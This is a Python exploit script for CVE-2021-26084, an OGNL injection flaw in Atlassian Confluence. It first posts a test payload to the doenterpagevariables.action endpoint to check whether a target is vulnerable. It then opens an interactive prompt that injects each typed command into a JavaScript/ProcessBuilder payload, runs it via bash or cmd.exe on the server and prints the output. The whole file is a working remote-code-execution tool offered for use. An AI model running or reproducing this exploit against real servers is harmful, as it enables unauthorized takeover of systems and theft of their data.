#/usr/bin/python3
# -*-encoding: utf-8
# __Author__: 9527
# Time:2021/09/01

import sys
import requests
import os
import platform
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def Help():
	print("UseAge: python3 CVE-2021-26084.py url")
	print("Eg. python3 CVE-2021-26084.py https://192.168.2.10")
	print("Can you give me star! Thank you")
	print("Github: https://github.com/smallpiggy")
	sys.exit()

def Checking():
	data1 = "queryString=aaa%5Cu0027%2B%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D%7D%2B%5Cu0027bbb"
	try:
		response1 = requests.post(url = V_Url,headers = headers,data = data1,verify = False,timeout = 10)
		if("aaa{class java.lang.String=null}bbb" in response1.text):
			print("[+] Detect CVE-2021-26084")
			return True
		else:
			print("[-] Target is not vuln")
			return False
	except Exception as e:
		print("[-] Server error")

def Exploit():
	while True:
		command = input("Confluence> ")
		if(command == 'exit' or command == 'bye'):
			print("~~~~~~~~bye bye~~~~~~~")
			sys.exit()
		if(command == 'cls' or command == 'clear'):
			if(Os_Name == 'Linux'):
				os.system("clear")
				continue
			if(Os_Name == 'Windows'):
				os.system("cls")
				continue
			else:
				pass
		data2 = {"queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022"+command+"\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
		try:
			response2 = requests.post(url = V_Url,headers = headers,data = data2,verify = False,timeout = 10)
			if(response2.status_code == 200):
				soup = BeautifulSoup(response2.text, 'html.parser')
				CmdShow = soup.find('input',attrs = {'name':'queryString', 'type':'hidden'})['value']
				print(CmdShow[9:-1])
		except Exception as e:
			print(e)
if __name__ == '__main__':
	if(len(sys.argv) < 2):
		Help()
	Url = sys.argv[1]
	if(Url[-1] == '/'):
		V_Url = Url + "pages/doenterpagevariables.action"
	else:
		V_Url = Url + "/pages/doenterpagevariables.action"
	headers = {"Upgrade-Insecure-Requests": "1",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"Accept-Encoding": "gzip, deflate",
	"Accept-Language": "en-US,en;q=0.9",
	"Connection": "close",
	"Content-Type": "application/x-www-form-urlencoded"
	}
	requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
	if(Checking() is True):
		Os_Name = platform.system()
		Exploit()